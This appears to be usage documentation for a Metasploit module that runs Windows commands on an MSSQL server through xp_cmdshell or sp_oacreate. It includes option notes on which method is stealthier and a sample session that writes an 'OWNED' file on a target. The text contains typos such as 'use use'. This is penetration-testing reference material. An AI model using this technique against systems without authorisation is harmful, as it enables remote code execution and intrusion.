## Description

This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell (default) or the sp_oacreate
procedure (more opsec safe, no output, no temporary data table). A valid username and password is required to use this
module. The sp_oacreate function is used in metasploit to rebuild the xp_cmdshell stored procedure but can be used
directly to get code execution which is the more opsec safe way.

## Options

### TECHNIQUE
Technique to use for command execution.

When `xp_cmdshell` is selected, the corresponding stored procedure is used. The [`xp_cmdshell`][1] stored procedure is
disabled by default, but Metasploit will attempt to enable it which requires elevated privileges. This technique returns
the output when the command was successfully run. If this technique fails, the module will attempt to use the
`sp_oacreate` technique instead.

When `sp_oacreate` is selected, a more stealthy technique will be used however no command output will be available. This
technique leverages the [`sp_OACreate`][2] stored procedure to create an instance of an OLE object and invokes
`wscript.shell`.

## Verification Steps

1. Do: `use use admin/mssql/mssql_exec`
2. Do: `set USERNAME [username1]`
3. Do: `set PASSWORD [password1]`
3. Do: `set TECHNIQUE sp_oacreate` (optional, defaults to xp_cmdshell)
4. Do: `set RHOSTS [IP]`
5. Do: `set CMD [command]`
6. Do: `run`

## Scenarios

```
msf > use use use admin/mssql/mssql_exec
msf auxiliary(mssql_exec) > set USERNAME username1
USERNAME => username1
msf auxiliary(mssql_exec) > set PASSWORD password1
PASSWORD => password1
msf auxiliary(mssql_exec) > set TECHNIQUE sp_oacreate
TECHNIQUE => sp_oacreate
msf auxiliary(mssql_exec) > set RHOST 192.168.1.195
RHOST => 192.168.1.195
msf auxiliary(mssql_exec) > set CMD cmd.exe /c echo OWNED > C:\owned.txt
CMD => cmd.exe /c echo OWNED > C:\owned.txt
msf auxiliary(mssql_exec) > run

[*] 192.168.1.195:1433 - Enabling advanced options and ole automation procedures.
[*] 192.168.1.195:1433 - Executing command using sp_oacreate. No output will be displayed.
[*] Auxiliary module execution completed
msf auxiliary(mssql_exec_oacreate) >
```

[1]: https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
[2]: https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-ver15
